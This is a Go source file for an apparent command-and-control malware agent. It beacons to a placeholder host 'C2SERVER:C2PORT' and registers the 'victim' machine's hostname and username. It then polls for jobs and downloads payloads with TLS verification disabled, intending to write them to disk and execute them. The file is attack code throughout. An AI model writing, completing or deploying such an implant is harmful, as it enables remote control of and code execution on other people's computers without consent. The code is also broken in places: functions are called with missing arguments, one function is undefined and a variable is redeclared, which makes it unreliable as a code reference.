package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/user"
	"time"

	"github.com/google/uuid"
)

var AuthorizationToken string
var AuthorizationTokenExpire string

func AGENTJOB() {
	CHECKCONNECTION()
	TRYTOCONNECT()
	CHECKJOBS()
}

func CHECKCONNECTION() {
	for {
		conn, err := net.Dial("tcp", "C2SERVER:C2PORT")
		if err == nil {
			break
		}
		defer conn.Close()
		time.Sleep(time.Second * 3)
	}
}

func TRYTOCONNECT() {
	id := uuid.New()
	uuid := id.String()
	hostname := GETHOSTNAME()
	username := GETUSERNAME()
	for {
		connectPostBody := map[string]string{"uuid": uuid, "hostname": hostname, "username": username}
		connectPostJson, err := json.Marshal(connectPostBody)
		if err != nil {
			fmt.Println(fmt.Errorf("can't marshal a json for POST login: %v", err))
		}
		req, err := http.NewRequest("POST", "https://C2SERVER:C2PORT/connect", bytes.NewBuffer(connectPostJson))
		if err != nil {
			fmt.Println(fmt.Errorf("can't create a POST request: %v", err))
		}
		req.Header.Set("Content-Type", "application/json")
		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(fmt.Errorf("can't perform a POST request: %v", err))
		}
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(fmt.Errorf("can't do io.ReadAll: %v", err))
		}
		var respJson struct {
			Code   int    `json:"code"`
			Expire string `json:"expire"`
			Token  string `json:"token"`
		}
		err = json.Unmarshal(respBody, &respJson)
		if err != nil {
			fmt.Println(fmt.Errorf("can't unmarshal a JSON in response: %v", err))
		}
		if respJson.Code == 200 {
			AuthorizationToken = respJson.Token
			AuthorizationTokenExpire = respJson.Expire
			fmt.Println(AuthorizationToken)
			break
		} else {
			fmt.Println(fmt.Errorf("can't login with this credentials: %v, %v", respJson.Code, err))
			time.Sleep(time.Second * 5)
		}
	}
}

func GETHOSTNAME() string {
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println(fmt.Errorf("can't get hostname of a victim: %v", err))
	}
	return hostname
}

func GETUSERNAME() string {
	user, err := user.Current()
	if err != nil {
		fmt.Println(fmt.Errorf("can't get a username on a victim: %v", err))
	}
	return user.Username
}

func CHECKJOBS() {
	for {
		req, err := http.NewRequest("GET", "https://C2SERVER:C2PORT/agent/jobs", nil)
		if err != nil {
			fmt.Println(fmt.Errorf("can't create a new request: %v", err))
		}
		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(fmt.Errorf("can't perform a POST request: %v", err))
		}
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(fmt.Errorf("can't do io.ReadAll: %v", err))
		}
		var respJson []string
		err = json.Unmarshal(respBody, &respJson)
		fmt.Println(respJson)
		if err != nil {
			fmt.Println(fmt.Errorf("can't unmarshal a JSON in response: %v", err))
		}
		if len(respJson) == 0 {
			time.Sleep(time.Second * 5)
		} else {
			DOJOBS(respJson)
		}
	}
}

func DOJOBS(jobs []string) {
	for _, job := range jobs {
		req, err := http.NewRequest("GET", "https://C2SERVER:C2PORT/agent/payload/"+job, nil)
		if err != nil {
			fmt.Println(fmt.Errorf("can't create a new request: %v", err))
		}
		req.Header.Set("Authorization", "Bearer "+AuthorizationToken)
		client := &http.Client{
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println(fmt.Errorf("can't perform a POST request: %v", err))

		}
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println(fmt.Errorf("can't do io.ReadAll: %v", err))
		}
		err := WRITETOFILE()
		RUNJOB()
	}
}

func WRITETOFILE(filename string, data string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("can't create a file %s: %v", filename, err)
	}
	defer file.Close()
	_, err = io.WriteString(file, data)
	if err != nil {
		return fmt.Errorf("can't write to a file %s: %v", filename, err)
	}
	return file.Sync()
}

func main() {
	AGENTJOB()
}
